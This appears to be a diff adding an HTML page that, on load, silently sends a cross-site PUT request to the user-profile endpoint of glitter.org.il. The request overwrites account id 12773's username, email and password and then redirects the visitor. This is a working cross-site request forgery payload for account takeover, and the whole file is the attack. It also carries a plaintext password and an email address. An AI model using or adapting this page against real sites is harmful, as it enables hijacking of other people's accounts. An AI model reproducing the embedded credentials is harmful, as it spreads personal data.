@@ -1,0 +1,54 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <script>
+        function sendRequestAndNavigate() {
+            // Create an XMLHttpRequest object
+            var xhr = new XMLHttpRequest();
+
+            // Set the HTTP method, URL, and asynchronous flag
+            xhr.open('PUT', 'http://glitter.org.il/user/', true);
+
+            // Set the request headers
+            xhr.setRequestHeader('Accept', 'application/json, text/plain, */*');
+            xhr.setRequestHeader('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36');
+            xhr.setRequestHeader('Content-Type', 'application/json');
+            xhr.setRequestHeader('Accept-Encoding', 'gzip, deflate');
+            xhr.setRequestHeader('Accept-Language', 'he-IL,he;q=0.9,en-US;q=0.8,en;q=0.7');
+
+            // Set the JSON body
+            var body = JSON.stringify({
+                "screen_name": "shlomo",
+                "avatar": "im4",
+                "description": "meaw meaw",
+                "privacy": "Private",
+                "id": 12773,
+                "user_name": "shlomo7",
+                "password": "meaw",
+                "gender": "Male",
+                "mail": "tkhgnmnzr40@gmail.com"
+            });
+
+            // Define the onload function
+            xhr.onload = function () {
+                if (xhr.status === 200) {
+                    // Request succeeded, navigate to another website
+                    window.location.href = 'http://glitter.org.il';
+                } else {
+                    // Request failed, display an error message
+                    alert('Request failed. Status: ' + xhr.status);
+                }
+            };
+
+            // Send the request
+            xhr.send(body);
+        }
+
+        // Call the function when the page loads
+        window.onload = sendRequestAndNavigate;
+    </script>
+</head>
+<body>
+    <h1>Sending PUT request...</h1>
+</body>
+</html>
